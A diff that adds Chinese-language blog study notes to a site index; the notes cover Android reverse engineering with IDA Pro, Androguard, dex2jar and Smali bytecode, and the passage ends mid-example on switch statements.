@@ -150,6 +150,513 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-IDA与Dex持续更新" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/19/IDA与Dex持续更新/">IDA与Dex持续更新</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/19/IDA与Dex持续更新/" class="archive-article-date">
+  	<time datetime="2018-08-19T12:57:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="IDA与DEX"><a href="#IDA与DEX" class="headerlink" title="IDA与DEX"></a>IDA与DEX</h2><ul>
+<li>dex文件的数据结构大部分在Android系统源码中dalvik\libdex\DexFile.h文件，可将其中的结构整理为dex.idc脚本，分析dex文件时导入即可。</li>
+<li>“Edit→Structs→Struct var”，或者按下快捷键ALT+Q，弹出选择结构类型对话框，选择不同的节格式化显示</li>
+<li>“Edit→Structs→Struct var”，或者按下快捷键ALT+Q，弹出选择结构类型对话框，选择段跳转</li>
+<li>dex文件中所有方法可以点击Exports选项卡查看<ul>
+<li>方法的命名规则为<em>类名. 方法名@ 方法声明</em></li>
+</ul>
+</li>
+<li>IDA Pro的反汇编代码使用ref关键字来表示非Java标准类型的引用<ul>
+<li><code>CODE:0002CFC4   invoke-super    {this, c}, &lt;ref ResourceCursorAdapter.swapCursor(ref) imp. @ _def_ResourceCursorAdapter_swapCursor@LL&gt;</code><ul>
+<li>前面的ref是swapCursor()方法的返回类型，后面括号中的ref是参数类型</li>
+<li>IDA Pro能智能识别Android SDK的API函数并使用imp关键字标识出来<ul>
+<li>imp表明该方法为Android SDK中的API，@后面的部分为API的声明，类名与方法名之间使用下划线分隔</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>两种程序退出方法：<strong>Context的finish()方法与android.os.Process的killProcess()方法</strong></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/19/IDA与Dex持续更新/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Androguard" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/19/Androguard/">Androguard</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/19/Androguard/" class="archive-article-date">
+  	<time datetime="2018-08-19T12:56:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Androguard的使用方法"><a href="#Androguard的使用方法" class="headerlink" title="Androguard的使用方法"></a>Androguard的使用方法</h2><ul>
+<li><p><strong>androapkinfo.py</strong></p>
+<ul>
+<li><strong>用来查看apk文件的信息</strong></li>
+<li>会输入apk文件的包、资源、权限、组件、方法等信息，输出的内容比较详细，可将输出信息重定向到文件后再进行查看</li>
+<li><code>./androapkinfo.py -i ./xxx.apk</code></li>
+</ul>
+</li>
+<li><p><strong>androaxml.py</strong></p>
+<ul>
+<li>用来<strong>解密apk包中的AndroidManifest.xml文件</strong></li>
+<li><code>./androaxml.py -i ./xxx.apk</code></li>
+</ul>
+</li>
+<li><p><strong>androcsign.py</strong></p>
+<ul>
+<li>用于<strong>添加apk文件的签名信息到一个数据库文件中</strong></li>
+<li>Androguard工具目录下的signatures/dbandroguard文件为收集的恶意软件信息数据库</li>
+<li>使用androcsign.py前需要为apk文件编写一个sign文件,json格式：eg</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"SAMPLE"</span>:<span class="string">"apks/xxx.apk"</span>     /*SAMPLE指定需要添加信息的apk文件*/</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        "BASE":"AndroidOS",			/*BASE指定文件运行的系统，目前固定为AndroidOS*/</span><br><span class="line">        "NAME":"DroidDream",		/*NAME是该签名的名字*/</span><br><span class="line">        "SIGNATURE":[				/*具体的签名规则*/</span><br><span class="line">            &#123;</span><br><span class="line">                "TYPE":"METHSIM",	/*TYPE用来指定签名的类型，METHSIM表示的是方法的签名，CLASSSIM表示为类签名*/</span><br><span class="line">                "CN":"Lcom/droider/xxx/MainActivity$SNChecker;", /*指定方法所在的类*/</span><br><span class="line">                "MN":"isRegistered"，	/*指定了方法名*/</span><br><span class="line">                "D":"()Z"				/*D指定了方法的签名信息*/</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        "BF":"0"					/*BF用来指定签名的检测规则*/</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>(json不允许/* //注释，需要则去掉注释部分)</p>
+<ul>
+<li><code>./androcsign.py -i signatures/xxx.apk -o signatures/dbandroguard</code></li>
+</ul>
+</li>
+<li><p><strong>androdd.py</strong></p>
+<ul>
+<li><strong>用来生成apk文件中每个类的方法的调用流程图</strong></li>
+<li><code>./androdd.py -i ./xxx.apk -o ./out -d -f PNG</code><ul>
+<li>-o选项强制指定一个输入目录，-d指定生成dot图形文件，-f用来指定输出的图片格式</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>androdiff.py</strong></p>
+<ul>
+<li><strong>用来比较两个apk文件的差异</strong></li>
+<li><code>./androdiff.py -i ./xxx.apk ./xxx1.apk</code></li>
+</ul>
+</li>
+<li><p><strong>androdump.py</strong></p>
+<ul>
+<li><strong>用来dump一个Linux进程的信息</strong></li>
+<li><code>./androdump.py -i pid</code></li>
+</ul>
+</li>
+<li><p><strong>androgexf.py</strong></p>
+<ul>
+<li><strong>用来生成APK的GEXF格式的图形文件</strong></li>
+<li>可以使用Gephi查看gexf格式的图像</li>
+<li><code>./androgext.py -i ./xxx.apk -o ./xxx.gexf</code></li>
+</ul>
+</li>
+<li><p><strong>andromercury.py</strong></p>
+<ul>
+<li>Mercury工具的框架</li>
+<li><strong>功能是对Mercury的包装</strong></li>
+</ul>
+</li>
+<li><p><strong>androrisk.py</strong></p>
+<ul>
+<li><strong>用于评估apk文件中潜在的风险</strong></li>
+<li><code>./androrisk.py -m -i ./xxx.apk</code></li>
+</ul>
+</li>
+<li><p><strong>androsign.py</strong></p>
+<ul>
+<li><strong>用于检测apk的信息是否存在于特定的数据库中</strong>，作用与androcsign.py相反</li>
+<li><code>./androsign.py -i apks/xxx.apk -b signatures/dbandroguard -c signatures/dbconfig</code></li>
+</ul>
+</li>
+<li><p><strong>androsim.py</strong></p>
+<ul>
+<li><strong>用于计算两个apk文件的相似度</strong></li>
+<li><code>./androsim.py -i ./xxx.apk ./xxx1.apk</code></li>
+<li>Windows移植版=androsim.exe</li>
+</ul>
+</li>
+<li><p><strong>androxgmml.py</strong></p>
+<ul>
+<li><strong>用来生成apk/jar/class/dex文件的控制流程及功能调用图</strong>，输出格式为xgmml<br>   <code>./androxgmml.py -i  ./xxx.apk    -o xxx.xgmml</code></li>
+</ul>
+</li>
+<li><p><strong>apkviewer.py</strong></p>
+<ul>
+<li>用来为<strong>apk文件中每一个类生成一个独立的graphml图形文件</strong></li>
+<li><code>./apkviewer.py -i ./xxx.apk -o output</code></li>
+<li>Gephi打开生成后的graphml文件,图形中的每个节点是指令级别</li>
+</ul>
+</li>
+<li><p><strong>androlyze.py</strong></p>
+<ul>
+<li>强大的静态分析工具，它提供的一个<strong>独立的Shell环境</strong></li>
+<li><code>./androlyze.py-s</code>进入androlyze的shell交互环境</li>
+<li>androlyze.py通过访问<u>对象的字段与方法的方式</u>来提供反馈结果，可用到3个对象：apk文件对象、dex文件对象、分析结果对象<ul>
+<li>apk文件对象 <code>a=APK(&quot;./xxx.apk&quot;)</code>            (a.+tab 可显示该类所有方法与字段)</li>
+<li>dex文件对象<code>d=DalvikVMFormat(a.get_dex())</code></li>
+<li>分析结果对象 <code>dx=VMAnalysis(d)</code></li>
+<li>或一条命令解决 <code>a,d,dx=AnalyzeAPK(&quot;./xxx.apk&quot;, decompiler=&quot;dad&quot;)</code> </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a.get_permissions()：输出apk用到的全部权限</span><br><span class="line">a.get_providers()：输出程序中所有的Content Provider</span><br><span class="line">a.get_receivers()：输出程序中所有的Broadcast Receiver</span><br><span class="line">a.get_services()：输出程序中所有的Service</span><br><span class="line">d.CLASS_Lcom_droider_XXX_MainActivity_2.METHOD_onClick.pretty_show():查看MainActivity$2的OnClick()方法.//source()显示Java源码</span><br><span class="line">dx.tainted_variables.get_string(&lt;要搜索的字符串&gt;)</span><br><span class="line">show_Path(d,dx.tainted_packages.search_packages(&lt;包名&gt;))</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/19/Androguard/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-dex2jar用法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/19/dex2jar用法/">dex2jar用法</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/19/dex2jar用法/" class="archive-article-date">
+  	<time datetime="2018-08-19T12:55:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>dex2jar用法<ul>
+<li>d2j-apk-sign用来为apk文件签名。命令格式：d2j-apk-sign xxx.apk。</li>
+<li>d2j-asm-verify用来验证jar文件。命令格式：d2j-asm-verify -d xxx.jar。</li>
+<li>d2j-dex2jar用来将dex文件转换成jar文件。命令格式：d2j-dex2jar xxx.apk</li>
+<li>d2j-dex-asmifier用来验证dex文件。命令格式：d2j-dex-asmifier xxx.dex。</li>
+<li>d2j-dex-dump用来转存dex文件的信息。命令格式：d2j-dex-dump xxx.apk out.jar。</li>
+<li>d2j-init-deobf用来生成反混淆jar文件时的初始化配置文件。</li>
+<li>d2j-jar2dex用来将jar文件转换成dex文件。命令格式：d2j-jar2dex xxx.apk。</li>
+<li>d2j-jar2jasmin用来将jar文件转换成jasmin格式的文件。命令格式：d2j-jar2jasmin xxx.jar</li>
+<li>d2j-jar-access用来修改jar文件中的类、方法以及字段的访问权限。</li>
+<li>d2j-jar-remap用来重命名jar文件中的包、类、方法以及字段的名称。</li>
+<li>d2j-jasmin2jar用来将jasmin格式的文件转换成jar文件。命令格式：d2j-jasmin2jar dir</li>
+<li>dex2jar为d2j-dex2jar的副本。</li>
+<li>dex-dump为d2j-dex-dump的副本</li>
+</ul>
+</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/19/dex2jar用法/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-对比Java代码结构与Smali代码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/19/对比Java代码结构与Smali代码/">对比Java代码结构与Smali代码</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/19/对比Java代码结构与Smali代码/" class="archive-article-date">
+  	<time datetime="2018-08-19T12:52:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Java代码结构与Smali代码语句分析"><a href="#Java代码结构与Smali代码语句分析" class="headerlink" title="Java代码结构与Smali代码语句分析"></a>Java代码结构与Smali代码语句分析</h2><h3 id="1-循环语句"><a href="#1-循环语句" class="headerlink" title="1.循环语句"></a>1.循环语句</h3><p>Android开发过程中，常见的循环结构有迭代器循环、for循环、while循环、do while循环。</p>
+<ul>
+<li><p>迭代器循环代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;对象&gt;&lt;对象名&gt;=&lt;方法返回一个对象列表&gt;;</span><br><span class="line"><span class="keyword">for</span>(&lt;对象&gt;&lt;对象名&gt;:&lt;对象列表&gt;)&#123;</span><br><span class="line">    [处理单个对象的代码体]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">Iterator&lt;对象&gt;&lt;迭代器&gt;=&lt;方法返回一个迭代器&gt;;</span><br><span class="line"><span class="keyword">while</span>(&lt;迭代器&gt;.hasNext())&#123;</span><br><span class="line">    &lt;对象&gt;&lt;对象&gt;=&lt;迭代器&gt;.next();</span><br><span class="line">    [处理单个对象的代码体]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取正在运行的进程列表，然后使用Toast弹出所有的进程名</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">iterator</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Object localObject = ((ActivityManager)getSystemService(<span class="string">"activity"</span>)).getRunningAppProcesses();</span><br><span class="line">    <span class="comment">//获取正在运行的进程列表使用ActivityManager类的getRunningAppProcesses()方法，后者会返回一个List&lt; RunningAppProcessInfo&gt;对象</span></span><br><span class="line">    StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    localObject = ((List)localObject).iterator();</span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">      <span class="keyword">if</span> (!((Iterator)localObject).hasNext())&#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, localStringBuilder.toString(), <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      localStringBuilder.append(((ActivityManager.RunningAppProcessInfo)((Iterator)localObject).next()).processName + <span class="string">'\n'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//部分smali代码</span></span><br><span class="line">invoke-virtual &#123;p0, v4&#125;, Lcom/droider/circulate/MainActivity;</span><br><span class="line">   -&gt;getSystemService(Ljava/lang/String;)Ljava/lang/Object;	#获取ActivityManager</span><br><span class="line">new-instance v3, Ljava/lang/StringBuilder;	#新建一个StringBuilder对象</span><br><span class="line">invoke-direct &#123;v3&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V	#调用StringBuilder构造函数</span><br><span class="line">invoke-interface &#123;v4&#125;, Ljava/util/Iterator;-&gt;hasNext()Z		#开始迭代</span><br><span class="line">invoke-interface &#123;v4&#125;, Ljava/util/Iterator;-&gt;next()Ljava/lang/Object;	#循环获取每一项</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>迭代器循环特点：</p>
+<ul>
+<li>迭代器循环会调用迭代器的hasNext()方法检测循环条件是否满足</li>
+<li>迭代器循环中调用迭代器的next()方法获取单个对象</li>
+<li>循环中使用goto指令来控制代码的流程</li>
+<li>for形式的迭代器循环展开后即为while形式的迭代器循环</li>
+</ul>
+</li>
+<li><p>for循环</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">forCirculate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List localList = getApplicationContext().getPackageManager().getInstalledApplications(<span class="number">8192</span>);</span><br><span class="line">    <span class="keyword">int</span> j = localList.size();</span><br><span class="line">    StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">      <span class="keyword">if</span> (i &gt;= j)&#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, localStringBuilder.toString(), <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      localStringBuilder.append(((ApplicationInfo)localList.get(i)).packageName + <span class="string">'\n'</span>);</span><br><span class="line">      i += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对于的核心smali语句</span></span><br><span class="line"><span class="keyword">const</span>/<span class="number">4</span> v1, <span class="number">0x0</span></span><br><span class="line">.local v1, i:I			#初始化v1=0</span><br><span class="line">:goto_0					#循环开始</span><br><span class="line">if-lt v1, v5, :cond_0   #如果v1小于v5，则跳转到cond_0 标号处</span><br><span class="line">.......</span><br><span class="line">:cond_0</span><br><span class="line">invoke-interface &#123;v0, v1&#125;, Ljava/util/List;-&gt;get(I)Ljava/lang/Object; #单个ApplicationInfo</span><br><span class="line">......</span><br><span class="line">add-int/lit8 v1, v1, 0x1	#下一个索引</span><br><span class="line">goto :goto_0    			#跳转到循环起始处</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>for循环的特点</p>
+<ul>
+<li>在进入循环前，需要先初始化循环计数器变量，且它的值需要在循环体中更改</li>
+<li>循环条件判断可以是条件跳转指令组成的合法语句</li>
+<li>循环中使用goto指令来控制代码的流程</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-switch语句"><a href="#2-switch语句" class="headerlink" title="2.switch语句"></a>2.switch语句</h3><h5 id="1-有规律的case分支"><a href="#1-有规律的case分支" class="headerlink" title="1.有规律的case分支"></a>1.有规律的case分支</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">packedSwitch</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">  String str = <span class="keyword">null</span>;  </span><br><span class="line">  <span class="keyword">switch</span> (i)&#123;</span><br><span class="line">  <span class="keyword">default</span>: </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"she is a person"</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"she is a baby"</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"she is a girl"</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>: </span><br><span class="line">  	<span class="keyword">return</span> <span class="string">"she is a woman"</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  	<span class="keyword">return</span> <span class="string">"she is an obasan"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对于部分smali代码</span></span><br><span class="line">.<span class="function">method <span class="keyword">private</span> <span class="title">packedSwitch</span><span class="params">(I)</span>Ljava/lang/String</span>;</span><br><span class="line">    .locals <span class="number">1</span></span><br><span class="line">    .param p1, "i"    # I</span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">21</span></span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v0, <span class="number">0x0</span></span><br><span class="line">    .line <span class="number">22</span></span><br><span class="line">    .local v0, <span class="string">"str"</span>:Ljava/lang/String;</span><br><span class="line">    packed-switch p1, :pswitch_data_0	#packed-switch分支，pswitch_data_0指定case区域</span><br><span class="line">    .line <span class="number">36</span></span><br><span class="line">    <span class="keyword">const</span>-string v0, <span class="string">"she is a person"</span></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    :goto_0</span><br><span class="line">    <span class="keyword">return</span>-object v0</span><br><span class="line">    .line <span class="number">24</span></span><br><span class="line">    :pswitch_0</span><br><span class="line">    <span class="keyword">const</span>-string v0, <span class="string">"she is a baby"</span></span><br><span class="line">    ................</span><br><span class="line">        .line <span class="number">33</span></span><br><span class="line">    :pswitch_3</span><br><span class="line">    <span class="keyword">const</span>-string v0, <span class="string">"she is an obasan"</span></span><br><span class="line">    .line <span class="number">34</span></span><br><span class="line">    goto :goto_0</span><br><span class="line">    .line <span class="number">22</span></span><br><span class="line">    nop</span><br><span class="line">    :pswitch_data_0				#case区域，从0开始，依次递增</span><br><span class="line">    .packed-<span class="keyword">switch</span> <span class="number">0x0</span>	</span><br><span class="line">        :pswitch_0</span><br><span class="line">        :pswitch_1</span><br><span class="line">        :pswitch_2</span><br><span class="line">        :pswitch_3</span><br><span class="line">    .end packed-<span class="keyword">switch</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
+<p>代码中的switch分支使用的是packed-switch指令。packed-switch指令在Dalvik中的格式如下：<code>packed-switch vAA, +BBBBBBBB</code></p>
+<p>指令后面的“+BBBBBBBB”被指明为一个packed-switch-payload格式的偏移:格式如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packed</span>-<span class="title">switch</span>-<span class="title">payload</span>&#123;</span></span><br><span class="line">    ushort	ident;		<span class="comment">//值固定为0x0100</span></span><br><span class="line">    ushort	size;		<span class="comment">//case数目</span></span><br><span class="line">    <span class="keyword">int</span>		first_key;	<span class="comment">//初始case的值</span></span><br><span class="line">    <span class="keyword">int</span>[]	targets;	<span class="comment">//每个case相对switch指令处的偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/19/对比Java代码结构与Smali代码/1.png" alt="1"></p>
+<p>IDA Pro找到“<code>packed-switch p1, :pswitch_data_0</code>”指令位于<code>0x2cb1a</code>处，相应的机器码为“<code>2B 02 13 00 00 00</code>”:2B为packed-switch的OpCode,02为寄存器p1,00000013为偏移量0x13。Dalvik中计算偏移是以<strong>两个字节</strong>为单位，因为实际该指令指向的<code>packed-switch-payload</code>结构体的偏移量为<code>0x2cb1a + 2 * 0x13 = 0x2cb40</code></p>
+<p><img src="/2018/08/19/对比Java代码结构与Smali代码/2.png" alt="2"></p>
+<ul>
+<li>第1个ident字段为0x100，标识packed-switch有效的case区域。</li>
+<li>第2个字段size为4，表明有4个case。</li>
+<li>第3个字段first_key为0，表明初始case值为0。</li>
+<li>第4个字段为偏移量，分别为0x6、0x9、0xc、0xf，加上packed-switch指令的偏移值0x2cb1a<ul>
+<li>case 0位置 = <code>0x2cb1a + 2 * 0x6 = 0x2cb26</code></li>
+<li>case 1位置 = <code>0x2cb1a + 2 * 0x9 = 0x2cb2c</code></li>
+<li>case 2位置 = <code>0x2cb1a + 2 * 0xc = 0x2cb32</code></li>
+<li>case 3位置 =<code>0x2cb1a + 2 * 0xf = 0x2cb38</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="2-无规律的case分支"><a href="#2-无规律的case分支" class="headerlink" title="2.无规律的case分支"></a>2.无规律的case分支</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">sparseSwitch</span><span class="params">(<span class="keyword">int</span> paramInt)</span></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (paramInt)&#123;</span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">      <span class="keyword">return</span> <span class="string">"he is a person"</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>: </span><br><span class="line">      <span class="keyword">return</span> <span class="string">"he is a 